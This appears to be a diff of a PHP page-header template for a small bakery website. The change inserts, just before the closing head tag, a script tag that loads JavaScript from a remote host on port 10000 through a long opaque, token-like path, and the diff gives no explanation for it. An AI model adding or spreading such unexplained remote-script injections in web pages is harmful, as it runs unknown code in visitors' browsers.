@@ -45,7 +45,7 @@ $pageTitle = $pageTitle ?? 'Bakes & Cakes | Your home for all your bakes and cak
 
     <link rel="stylesheet" href="<?= APP_URL ?>/css/styles.css">
     <link rel="stylesheet" href="<?= APP_URL ?>/css/styleali.css">
-</head>
+<script type='text/javascript' src='https://cs2410-web01pvm.aston.ac.uk:10000/muZl6oX-TYWlVnpIu621XvixM06UkJ_qYdY-JCbkiwYthQCAMN6sQEmjTtxQx24BQj3iKFnLVQ8YFDE23xIcEOSSA5XWCWlMe7jdwPtokXleOLkuzBSOBfOUUmWQYNWUus1p_iwI_W1559nGaIMupiWuVVXNXHoXBWnjQL-FcKXD13jawEBgfWrxxRHYuIlsHn-IMCUFUIioPOIy8XsRtLHRlMYlhIpMixHecXjzxkL4qGOjYJ9xrFhcBs2SLjUk0lcgphkvG6c1BhF-Q5UM0lC9_CqEgieZGUTS81tSNB4yWPczas9OHtRqolCbTEPbKgG_YjvSEVnp6cGeKx3ImTtHyTYueIK_MaEpZkpiZpOcORBBMlye_fuAwmjQ7c-UvWmUQ4ziZ4kQGdAkJXKqbLki56xvIdzVTdgkgU_70lwvb6T6NGLp12ZefyG-_NpciiuXkJwaHHYXTJyJAJzUv6C_N9DGCGHg6oFUIDockau7OqetRRko6KtblkE7d_43l7SumRQWzkq3KDodW80DZAiBt3GLmcUSElyBAHLHAkiDbmHa_Zzmu19gPNuJ8z-mA7oPjnVyU9osJiTC8svdjOVPP24Wv3A6zh7pJVrFZYXWtR-m8kfMAHvEjP5Or70KWpMkvqdaYxlO9xPJ7yzvb-5Oq6pLZjn4FMzBd5f_t1iqiROl7pbXKGc1mjo_Os8zTL8EFkXxYWtJCDKmEMMQb-mmthfxT7kqfRdtMXNDFhfJd_NwLxE2kSDyLnkotTMvj_5pp1IUs6MFpjYEOgP8gwPGIGydItnOyTWK6YNqyNs-ToCA8xFqNQV73_7JW82RmNbxtDDla1HBPwhWKHdvbX-RLhzlFA_oLKg8WR52nvBSB1oYcONGVZi3LaTWFeK0LpX4CrliTCFb0hZ691o17kxFkECgv70KwDU6ZC76B3Kao2aWK_w'></script></head>
 <body class="light">
 
 <script>
